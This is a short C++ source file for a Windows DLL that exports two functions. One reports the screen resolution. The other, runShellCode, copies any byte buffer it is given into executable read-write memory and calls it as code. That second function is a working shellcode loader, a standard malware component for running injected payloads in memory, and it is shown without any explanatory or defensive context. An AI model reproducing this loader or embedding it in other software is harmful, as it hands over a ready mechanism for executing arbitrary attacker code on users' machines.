#include "pch.h"


extern "C" __declspec(dllexport)
int* getResolution()
{
    int* res = new int[2];
    DEVMODE devMode =  DEVMODE();
    EnumDisplaySettings(NULL, -1, &devMode);
    res[0] = devMode.dmPelsWidth;
    res[1] = devMode.dmPelsHeight;
    return res;
}

extern "C" __declspec(dllexport)
int runShellCode(const char* shellCode, int shellCodeSize)
{
    void* exec = VirtualAlloc(0, shellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
    {
        return -2; 
    }
    memcpy(exec, shellCode, shellCodeSize);
    if (memcmp(exec, shellCode, shellCodeSize) != 0)
    {
        VirtualFree(exec, 0, MEM_RELEASE);
        return -3; 
    }
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0; 
}